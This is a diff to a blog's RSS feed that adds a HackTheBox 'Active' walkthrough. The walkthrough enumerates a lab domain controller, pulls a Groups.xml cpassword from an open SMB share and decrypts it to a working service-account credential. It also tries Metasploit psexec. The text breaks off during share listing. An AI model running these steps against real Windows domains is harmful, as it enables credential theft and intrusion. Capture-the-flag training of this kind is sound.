@@ -6,8 +6,8 @@
 </description>
     <link>http://snoopysecurity.github.io/</link>
     <atom:link href="http://snoopysecurity.github.io/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Thu, 13 Jun 2019 00:51:36 +0100</pubDate>
-    <lastBuildDate>Thu, 13 Jun 2019 00:51:36 +0100</lastBuildDate>
+    <pubDate>Fri, 05 Jul 2019 01:27:52 +0100</pubDate>
+    <lastBuildDate>Fri, 05 Jul 2019 01:27:52 +0100</lastBuildDate>
     <generator>Jekyll v3.2.1</generator>
     
       <item>
@@ -1413,6 +1413,606 @@ print(s.posix.dumps(0))
         
         
         <category>netsec</category>
+        
+      </item>
+    
+      <item>
+        <title>HackTheBox : Active Walkthrough</title>
+        <description>&lt;p&gt;This walkthrough is a guide on how to exploit HTB Active machine. A quick nmap scan of the target system reveals the following information. The arguement &lt;code class=&quot;highlighter-rouge&quot;&gt;-p-&lt;/code&gt; can also be used to scan the entire port range upto 65536&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# nmap -sV 10.10.10.100 -n -sC -Pn -vvv
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-21 16:23 EDT
+NSE: Loaded 148 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 16:26
+Completed NSE at 16:26, 0.29s elapsed
+Nmap scan report for 10.10.10.100
+Host is up, received user-set (0.055s latency).
+Scanned at 2019-06-21 16:23:12 EDT for 215s
+Not shown: 983 closed ports
+Reason: 983 resets
+PORT      STATE SERVICE       REASON          VERSION
+53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
+| dns-nsid: 
+|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2019-06-21 20:17:10Z)
+135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
+389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds? syn-ack ttl 127
+464/tcp   open  kpasswd5?     syn-ack ttl 127
+593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped    syn-ack ttl 127
+3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (c)
+3269/tcp  open  tcpwrapped    syn-ack ttl 127
+49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -6m20s, deviation: 0s, median: -6m20s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 8052/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 40109/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 20043/udp): CLEAN (Timeout)
+|   Check 4 (port 38631/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2019-06-21 16:18:12
+|_  start_date: 2019-06-21 07:26:26
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 2) scan.
+Initiating NSE at 16:26
+Completed NSE at 16:26, 0.00s elapsed
+NSE: Starting runlevel 2 (of 2) scan.
+Initiating NSE at 16:26
+Completed NSE at 16:26, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 214.99 seconds
+           Raw packets sent: 1344 (59.136KB) | Rcvd: 1001 (40.108KB)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Looking at the provided LDAP information, it can be deduced that DNS name for this machine is active.htb. This can be added to your hosts file. It is also obvious that by the services open such as DNS, LDAP and Kerberos, this is a domain controller&lt;/p&gt;
+
+&lt;h3 id=&quot;ldap-enumeration&quot;&gt;LDAP Enumeration&lt;/h3&gt;
+
+&lt;p&gt;Since LDAP is open, enumeration can be conduced on this service.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# nmap -p 389 --script ldap-rootdse active.htb
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-22 16:58 EDT
+Nmap scan report for active.htb (10.10.10.100)
+Host is up (0.057s latency).
+
+PORT    STATE SERVICE
+389/tcp open  ldap
+| ldap-rootdse: 
+| LDAP Results
+|   &amp;lt;ROOT&amp;gt;
+|       currentTime: 20190622205142.0Z
+|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=active,DC=htb
+|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
+|       namingContexts: DC=active,DC=htb
+|       namingContexts: CN=Configuration,DC=active,DC=htb
+|       namingContexts: CN=Schema,CN=Configuration,DC=active,DC=htb
+|       namingContexts: DC=DomainDnsZones,DC=active,DC=htb
+|       namingContexts: DC=ForestDnsZones,DC=active,DC=htb
+|       defaultNamingContext: DC=active,DC=htb
+|       schemaNamingContext: CN=Schema,CN=Configuration,DC=active,DC=htb
+|       configurationNamingContext: CN=Configuration,DC=active,DC=htb
+|       rootDomainNamingContext: DC=active,DC=htb
+|       supportedControl: 1.2.840.113556.1.4.319
+|       supportedControl: 1.2.840.113556.1.4.801
+|       supportedControl: 1.2.840.113556.1.4.473
+|       supportedControl: 1.2.840.113556.1.4.528
+|       supportedControl: 1.2.840.113556.1.4.417
+|       supportedControl: 1.2.840.113556.1.4.619
+|       supportedControl: 1.2.840.113556.1.4.841
+|       supportedControl: 1.2.840.113556.1.4.529
+|       supportedControl: 1.2.840.113556.1.4.805
+|       supportedControl: 1.2.840.113556.1.4.521
+|       supportedControl: 1.2.840.113556.1.4.970
+|       supportedControl: 1.2.840.113556.1.4.1338
+|       supportedControl: 1.2.840.113556.1.4.474
+|       supportedControl: 1.2.840.113556.1.4.1339
+|       supportedControl: 1.2.840.113556.1.4.1340
+|       supportedControl: 1.2.840.113556.1.4.1413
+|       supportedControl: 2.16.840.1.113730.3.4.9
+|       supportedControl: 2.16.840.1.113730.3.4.10
+|       supportedControl: 1.2.840.113556.1.4.1504
+|       supportedControl: 1.2.840.113556.1.4.1852
+|       supportedControl: 1.2.840.113556.1.4.802
+|       supportedControl: 1.2.840.113556.1.4.1907
+|       supportedControl: 1.2.840.113556.1.4.1948
+|       supportedControl: 1.2.840.113556.1.4.1974
+|       supportedControl: 1.2.840.113556.1.4.1341
+|       supportedControl: 1.2.840.113556.1.4.2026
+|       supportedControl: 1.2.840.113556.1.4.2064
+|       supportedControl: 1.2.840.113556.1.4.2065
+|       supportedControl: 1.2.840.113556.1.4.2066
+|       supportedLDAPVersion: 3
+|       supportedLDAPVersion: 2
+|       supportedLDAPPolicies: MaxPoolThreads
+|       supportedLDAPPolicies: MaxDatagramRecv
+|       supportedLDAPPolicies: MaxReceiveBuffer
+|       supportedLDAPPolicies: InitRecvTimeout
+|       supportedLDAPPolicies: MaxConnections
+|       supportedLDAPPolicies: MaxConnIdleTime
+|       supportedLDAPPolicies: MaxPageSize
+|       supportedLDAPPolicies: MaxQueryDuration
+|       supportedLDAPPolicies: MaxTempTableSize
+|       supportedLDAPPolicies: MaxResultSetSize
+|       supportedLDAPPolicies: MinResultSets
+|       supportedLDAPPolicies: MaxResultSetsPerConn
+|       supportedLDAPPolicies: MaxNotificationPerConn
+|       supportedLDAPPolicies: MaxValRange
+|       supportedLDAPPolicies: ThreadMemoryLimit
+|       supportedLDAPPolicies: SystemMemoryLimitPercent
+|       highestCommittedUSN: 90299
+|       supportedSASLMechanisms: GSSAPI
+|       supportedSASLMechanisms: GSS-SPNEGO
+|       supportedSASLMechanisms: EXTERNAL
+|       supportedSASLMechanisms: DIGEST-MD5
+|       dnsHostName: DC.active.htb
+|       ldapServiceName: active.htb:dc$@ACTIVE.HTB
+|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb
+|       supportedCapabilities: 1.2.840.113556.1.4.800
+|       supportedCapabilities: 1.2.840.113556.1.4.1670
+|       supportedCapabilities: 1.2.840.113556.1.4.1791
+|       supportedCapabilities: 1.2.840.113556.1.4.1935
+|       supportedCapabilities: 1.2.840.113556.1.4.2080
+|       isSynchronized: TRUE
+|       isGlobalCatalogReady: TRUE
+|       domainFunctionality: 4
+|       forestFunctionality: 4
+|_      domainControllerFunctionality: 4
+Service Info: Host: DC; OS: Windows 2008 R2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Root Directory Server Agent Service Entry or RootDSE is usually provided LDAP servers and they must provide information about itself and other information that is specific to each server.&lt;/p&gt;
+
+&lt;p&gt;The ldap-brute script can also be used to conduct brute force attacks on the server using LDAP, however this can be dangeorus and could lock out valid accounts. If Anonymous Bind is enabled , we could conduct ldap search queries to try searching for the base. However, it looks like that is not possible.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# ldapsearch -h 10.10.10.100 -p 389 -x -b &quot;dc=active,dc=htb&quot;
+# extended LDIF
+#
+# LDAPv3
+# base &amp;lt;dc=active,dc=htb&amp;gt; with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# search result
+search: 2
+result: 1 Operations error
+text: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this opera
+ tion a successful bind must be completed on the connection., data 0, v1db1
+
+# numResponses: 1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;smb-enumeration&quot;&gt;SMB Enumeration&lt;/h3&gt;
+
+&lt;p&gt;Since SMB is open, enum4linux can be used to conduct information on that service.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# enum4linux 10.10.10.100
+Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jun 22 17:23:52 2019
+
+ ========================== 
+|    Target Information    |
+ ========================== 
+Target ........... 10.10.10.100
+RID Range ........ 500-550,1000-1050
+Username ......... ''
+Password ......... ''
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ ==================================================== 
+|    Enumerating Workgroup/Domain on 10.10.10.100    |
+ ==================================================== 
+[E] Can't find workgroup/domain
+
+
+ ============================================ 
+|    Nbtstat Information for 10.10.10.100    |
+ ============================================ 
+Looking up status of 10.10.10.100
+No reply from 10.10.10.100
+
+ ===================================== 
+|    Session Check on 10.10.10.100    |
+ ===================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
+[+] Server 10.10.10.100 allows sessions using username '', password ''
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
+[+] Got domain/workgroup name: 
+
+ =========================================== 
+|    Getting domain SID for 10.10.10.100    |
+ =========================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
+could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
+could not obtain sid from server
+error: NT_STATUS_ACCESS_DENIED
+[+] Can't determine if host is part of domain or part of a workgroup
+
+ ====================================== 
+|    OS information on 10.10.10.100    |
+ ====================================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
+Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
+[+] Got OS info for 10.10.10.100 from smbclient: 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
+[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED
+
+ ============================= 
+|    Users on 10.10.10.100    |
+ ============================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
+[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED
+
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
+[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED
+
+ ========================================= 
+|    Share Enumeration on 10.10.10.100    |
+ ========================================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Replication     Disk      
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Failed to connect with SMB1 -- no workgroup available
+
+[+] Attempting to map shares on 10.10.10.100
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
+//10.10.10.100/ADMIN$	Mapping: DENIED, Listing: N/A
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
+//10.10.10.100/C$	Mapping: DENIED, Listing: N/A
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
+//10.10.10.100/IPC$	Mapping: OK	Listing: DENIED
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
+//10.10.10.100/NETLOGON	Mapping: DENIED, Listing: N/A
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
+//10.10.10.100/Replication	Mapping: OK, Listing: OK
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
+//10.10.10.100/SYSVOL	Mapping: DENIED, Listing: N/A
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
+//10.10.10.100/Users	Mapping: DENIED, Listing: N/A
+
+ ==================================================== 
+|    Password Policy Information for 10.10.10.100    |
+ ==================================================== 
+[E] Unexpected error from polenum:
+
+
+[+] Attaching to 10.10.10.100 using a NULL share
+
+[+] Trying protocol 445/SMB...
+
+	[!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
+
+[+] Trying protocol 139/SMB...
+
+	[!] Protocol failed: ('Cannot request session', 240, 130)
+
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
+
+[E] Failed to get password policy with rpcclient
+
+
+ ============================== 
+|    Groups on 10.10.10.100    |
+ ============================== 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
+
+[+] Getting builtin groups:
+[E] Can't get builtin groups: NT_STATUS_ACCESS_DENIED
+
+[+] Getting builtin group memberships:
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
+
+[+] Getting local groups:
+[E] Can't get local groups: NT_STATUS_ACCESS_DENIED
+
+[+] Getting local group memberships:
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.
+
+[+] Getting domain groups:
+[E] Can't get domain groups: NT_STATUS_ACCESS_DENIED
+
+[+] Getting domain group memberships:
+
+ ======================================================================= 
+|    Users on 10.10.10.100 via RID cycling (RIDS: 500-550,1000-1050)    |
+ ======================================================================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
+[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
+
+ ============================================= 
+|    Getting printer info for 10.10.10.100    |
+ ============================================= 
+Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
+could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIED
+could not obtain sid from server
+error: NT_STATUS_ACCESS_DENIED
+
+
+enum4linux complete on Sat Jun 22 17:24:30 2019
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Looking at enum4linux output, the Replication share (//10.10.10.100/Replication) seems to be accessible. SMBClient (&lt;code class=&quot;highlighter-rouge&quot;&gt;smbclient -L 10.10.10.100&lt;/code&gt;) can also be used to confirm this.&lt;/p&gt;
+
+&lt;p&gt;By enumerating this share using smbmap, the following can be seen:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# smbmap -R Replication -H 10.10.10.100 
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.100...
+[+] IP: 10.10.10.100:445	Name: active.htb                                        
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	Replication                                       	READ ONLY
+	.\
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	active.htb
+	.\\active.htb\
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	DfsrPrivate
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Policies
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	scripts
+	.\\active.htb\DfsrPrivate\
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	ConflictAndDeleted
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Deleted
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Installing
+	.\\active.htb\Policies\
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	{31B2F340-016D-11D2-945F-00C04FB984F9}
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	{6AC1786C-016F-11D2-945F-00C04fB984F9}
+	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
+	-r--r--r--               23 Sat Jul 21 06:38:11 2018	GPT.INI
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Group Policy
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	MACHINE
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	USER
+	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
+	-r--r--r--              119 Sat Jul 21 06:38:11 2018	GPE.INI
+	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Microsoft
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Preferences
+	-r--r--r--             2788 Sat Jul 21 06:38:11 2018	Registry.pol
+	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Windows NT
+	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	SecEdit
+	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
+	-r--r--r--             1098 Sat Jul 21 06:38:11 2018	GptTmpl.inf
+	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	Groups
+	.\\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
+	-r--r--r--              533 Sat Jul 21 06:38:11 2018	Groups.xml
+	.\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	.
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	..
+	-r--r--r--               22 Sat Jul 21 06:38:11 2018	GPT.INI
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	MACHINE
+	dr--r--r--                0 Sat Jul 21 06:37:44 2018	USER
+	.\\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;It seems that that Groups.xml file is accessible. In older versions of Windows servers (pre 2012), Groups.xml can be used by system administrator to create local administators within a domain using a domain controller. This file can be fetched using &lt;code class=&quot;highlighter-rouge&quot;&gt;smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Looking at the obtained Groups.xml file, the important sections in the groups.xml file are the username and cpassword.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;Groups&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;User&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;active.htb\SVC_TGS&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;image=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changed=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2018-07-18 20:46:06&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;uid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;Properties&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;U&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;newName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;fullName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;description=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cpassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changeLogon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;noChange=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;neverExpires=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;acctDisabled=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;userName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;active.htb\SVC_TGS&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;/User&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/Groups&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;gpp-decrypt can be used to get the plaintext value of the recovered cpassword.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
+GPPstillStandingStrong2k18
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Using metasploit’s SMB Login module, these credentials can be used to double check access.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 auxiliary(scanner/smb/smb_login) &amp;gt; run
+
+[*] 10.10.10.100:445      - 10.10.10.100:445 - Starting SMB login bruteforce
+[+] 10.10.10.100:445      - 10.10.10.100:445 - Success: 'active.htb\SVC_TGS:GPPstillStandingStrong2k18'
+[!] 10.10.10.100:445      - No active DB -- Credential data will not be saved!
+[*] 10.10.10.100:445      - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf5 auxiliary(scanner/smb/smb_login) &amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;However, it looks like this user doesn’t have administrator privileges so psexec is not possible.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] Started reverse TCP handler on 10.10.14.9:4444 
+[*] 10.10.10.100:445 - Connecting to the server...
+[*] 10.10.10.100:445 - Authenticating to 10.10.10.100:445|active.htb as user 'SVC_TGS'...
+[-] 10.10.10.100:445 - Exploit failed [no-access]: RubySMB::Error::UnexpectedStatusCode STATUS_ACCESS_DENIED
+[*] Exploit completed, but no session was created.
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Enumeration the shares again using smbmap, the users share seems to be accessible&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100
+[+] Finding open SMB ports....
+[+] User SMB session establishd on 10.10.10.100...
+[+] IP: 10.10.10.100:445	Name: active.htb                                        
+	Disk                                                  	Permissions
+	----                                                  	-----------
+	ADMIN$                                            	NO ACCESS
+	C$                                                	NO ACCESS
+	IPC$                                              	NO ACCESS
+	NETLOGON                                          	READ ONLY
+	Replication                                       	READ ONLY
+	SYSVOL                                            	READ ONLY
+	Users                                             	READ ONLY
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Enumeration of the SVC_TGS user directories revealed that the user.txt is stored within the user’s desktop.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Downloads# smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100 -r Users\\SVC_TGS\\Desktop
+[+] Finding open SMB ports....
